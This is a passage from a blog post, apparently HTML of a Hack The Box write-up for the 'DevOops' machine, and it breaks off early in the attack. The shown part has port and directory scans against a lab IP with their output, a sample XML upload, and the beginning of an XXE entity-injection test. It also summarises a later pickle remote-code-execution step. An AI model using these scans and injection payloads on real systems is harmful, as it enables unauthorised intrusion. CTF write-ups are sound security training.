@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.51" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack The Box Write-up - DevOops | text/plain</title>
+    <meta name="description" content="Write-up for the machine DevOops from Hack The Box.
+The box is Python-focused and illustrates nicely the various kinds of mistakes
+you can make when using Python libraries carelessly. XML parsing is vulnerable
+to XXE, giving access to source code. The source reveals that pickle is used to
+parse user input, which turns into RCE as an unpriviledged user. From there,
+searching the history of a git repository left on the box exposes a deleted
+private key, which can be used to SSH in with root. There is an unintended 
+shortcut since the SSH key of the unpriviledged user is accessible via XXE,
+but I ignore this way in for this write-up.
+">
+    <meta name="keywords" content="ctf, infosec, hackthebox, write-up">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Hack The Box Write-up - DevOops" />
+<meta property="og:description" content="Write-up for the machine DevOops from Hack The Box.
+The box is Python-focused and illustrates nicely the various kinds of mistakes
+you can make when using Python libraries carelessly. XML parsing is vulnerable
+to XXE, giving access to source code. The source reveals that pickle is used to
+parse user input, which turns into RCE as an unpriviledged user. From there,
+searching the history of a git repository left on the box exposes a deleted
+private key, which can be used to SSH in with root. There is an unintended 
+shortcut since the SSH key of the unpriviledged user is accessible via XXE,
+but I ignore this way in for this write-up.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/htb_devoops/" /><meta property="article:published_time" content="2018-10-13T00:00:00&#43;02:00"/>
+<meta property="article:modified_time" content="2018-10-13T00:00:00&#43;02:00"/>
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/htb_devoops/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    
+<meta itemprop="name" content="Hack The Box Write-up - DevOops">
+<meta itemprop="description" content="Write-up for the machine DevOops from Hack The Box.
+The box is Python-focused and illustrates nicely the various kinds of mistakes
+you can make when using Python libraries carelessly. XML parsing is vulnerable
+to XXE, giving access to source code. The source reveals that pickle is used to
+parse user input, which turns into RCE as an unpriviledged user. From there,
+searching the history of a git repository left on the box exposes a deleted
+private key, which can be used to SSH in with root. There is an unintended 
+shortcut since the SSH key of the unpriviledged user is accessible via XXE,
+but I ignore this way in for this write-up.
+">
+
+
+<meta itemprop="datePublished" content="2018-10-13T00:00:00&#43;02:00" />
+<meta itemprop="dateModified" content="2018-10-13T00:00:00&#43;02:00" />
+<meta itemprop="wordCount" content="1441">
+
+
+
+<meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
+
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Hack The Box Write-up - DevOops</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>7 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2018-10-13T00:00:00&#43;02:00">13 Oct, 2018</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Write-up for the machine DevOops from Hack The Box.
+The box is Python-focused and illustrates nicely the various kinds of mistakes
+you can make when using Python libraries carelessly. XML parsing is vulnerable
+to XXE, giving access to source code. The source reveals that pickle is used to
+parse user input, which turns into RCE as an unpriviledged user. From there,
+searching the history of a git repository left on the box exposes a deleted
+private key, which can be used to SSH in with root. There is an unintended 
+shortcut since the SSH key of the unpriviledged user is accessible via XXE,
+but I ignore this way in for this write-up.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scan">Port scan</a></li>
+<li><a href="#inspecting-gunicorn">Inspecting gunicorn</a></li>
+<li><a href="#reading-files-with-xxe">Reading files with XXE</a></li>
+<li><a href="#rce-with-pickle">RCE with pickle</a></li>
+</ul></li>
+<li><a href="#on-the-system">On the system</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      
+
+<h1 id="enumeration">Enumeration</h1>
+
+<h2 id="port-scan">Port scan</h2>
+
+<p>Start with a fast standard port scan and you find only two open ports:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ masscan -e tun0 -p <span style="color: #ae81ff">1</span>-65535 --rate <span style="color: #ae81ff">2000</span> <span style="color: #ae81ff">10</span>.10.10.91
+...
+Discovered open port 22/tcp on 10.10.10.91
+Discovered open port 5000/tcp on 10.10.10.91
+</code></pre></div>
+
+<p>A targeted <code>nmap</code> scan confirms SSH on port 22 and identifies port 5000 as a
+Python web server, running <a href="https://gunicorn.org/">gunicorn</a>:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ nmap -sV -sC -p <span style="color: #ae81ff">22</span>,5000 <span style="color: #ae81ff">10</span>.10.10.91
+...
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol
+2.0)
+| ssh-hostkey:
+|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
+|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
+|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
+5000/tcp open  http    Gunicorn 19.7.1
+|_http-server-header: gunicorn/19.7.1
+|_http-title: Site doesn&#39;,t have a title (text/html; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+...
+</code></pre></div>
+
+<h2 id="inspecting-gunicorn">Inspecting gunicorn</h2>
+
+<p>First, start <code>wfuzz</code> to have it running in the background.
+It will find all the necessary endpoints quickly:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ wfuzz --hc<span style="color: #f92672">=</span><span style="color: #ae81ff">404</span> -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.91:5000/FUZZ
+...
+000126:  C=200   1815 L    15336 W        546263 Ch       &quot;feed&quot;
+000366:  C=200      0 L       39 W          347 Ch        &quot;upload&quot;
+019602:  C=405      4 L       23 W          178 Ch        &quot;newpost&quot;
+</code></pre></div>
+
+<p>Visiting the main home page at &ldquo;<a href="http://10.10.10.91:5000&quot;">http://10.10.10.91:5000&quot;</a> returns a simple
+page, indicating the homepage is under development (see HTML below).
+There are no links to the endpoints we discover via fuzzing. Nevertheless, note
+that the page suggests the source code should be in a file called &ldquo;feed.py&rdquo;.
+This will come in handy later:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-html" data-lang="html"><span></span><span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">html</span><span style="color: #f8f8f2">&gt;</span>
+  <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">body</span><span style="color: #f8f8f2">&gt;</span>
+    Under construction!<span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">br</span><span style="color: #f8f8f2">&gt;</span>
+    <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
+      This is feed.py, which will become the MVP for Blogfeeder application.
+    <span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
+    <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
+      TODO: replace this with the proper feed from the dev.solita.fi backend.
+    <span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
+    <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
+      <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">img</span> <span style="color: #a6e22e">src</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;/feed&quot;</span> <span style="color: #a6e22e">align</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;center&quot;</span> <span style="color: #a6e22e">width</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;60%&quot;</span> <span style="color: #a6e22e">height</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;60%&quot;</span><span style="color: #f8f8f2">&gt;</span>
+    <span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
+  <span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">body</span><span style="color: #f8f8f2">&gt;</span>
+<span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">html</span><span style="color: #f8f8f2">&gt;</span>
+</code></pre></div>
+
+<p>At &ldquo;<a href="http://10.10.10.91:5000/upload&quot;">http://10.10.10.91:5000/upload&quot;</a> is a file upload, which wants you to
+upload XML files with the fields &ldquo;Author&rdquo;, &ldquo;Subject&rdquo; and &ldquo;Content&rdquo;. We can test
+the endpoint by crafting a sample XML file:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-xml" data-lang="xml"><span></span><span style="color: #75715e">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span style="color: #f92672">&lt;body&gt;</span>
+  <span style="color: #f92672">&lt;Author&gt;</span>auth<span style="color: #f92672">&lt;/Author&gt;</span>
+  <span style="color: #f92672">&lt;Subject&gt;</span>subj<span style="color: #f92672">&lt;/Subject&gt;</span>
+  <span style="color: #f92672">&lt;Content&gt;</span>cont<span style="color: #f92672">&lt;/Content&gt;</span>
+<span style="color: #f92672">&lt;/body&gt;</span>
+</code></pre></div>
+
+<p>On upload the page returns a confirmation that it successfully processed
+the file:</p>
+
+<pre><code> PROCESSED BLOGPOST: 
+Author: auth
+Subject: subj
+Content: cont
+URL for later reference: /uploads/file.xml
+File path: /home/roosa/deploy/src
+</code></pre>
+
+<p>It also returns the path &ldquo;/home/roosa/deploy/src&rdquo;, which sounds a lot like the
+deployed source code should live here.</p>
+
+<h2 id="reading-files-with-xxe">Reading files with XXE</h2>
+
+<p>It is interesting that the upload confirmation contains the content of the
+uploaded XML. If we could inject XML entities, it would be possible to read
+local files from the system, such as
+the source code of the application. In Python, it is very easy to accidentally
+use an XML parser vulnerable to it if you do not read the
+<a href="https://docs.python.org/2/library/xml.html">docs</a> carefully. For example, just
+writing <code>import xml.sax</code> and using it&rsquo;s <code>make_parser</code> method is enough to build
+a parser which is vulnerable by default.</p>
+
+<p>A simple test is the XML payload below. It injects then contents &ldquo;cont&rdquo; as an
+XML entity named &ldquo;example&rdquo; into the document. If entity injection works, the
+output should not change:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-xml" data-lang="xml"><span></span><span style="color: #75715e">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span style="color: #75715e">&lt;!DOCTYPE replace [&lt;!ENTITY example &quot;cont&quot;&gt;</span> ]&gt;
+<span style="color: #f92672">&lt;body&gt;</span>
+  <span style="color: #f92672">&lt;Author&gt;</span>auth<span style="color: #f92672">&lt;/Author&gt;</span>
+  <span style="color: #f92672">&lt;Subject&gt;</span>subj<span style="color: #f92672">&lt;/Subject&gt;</span>
+  <span style="color: #f92672">&lt;Content&gt;</span><span style="color: #f8f8f2">&amp;example;</span><span style="color: #f92672">&lt;/Content&gt;</span>
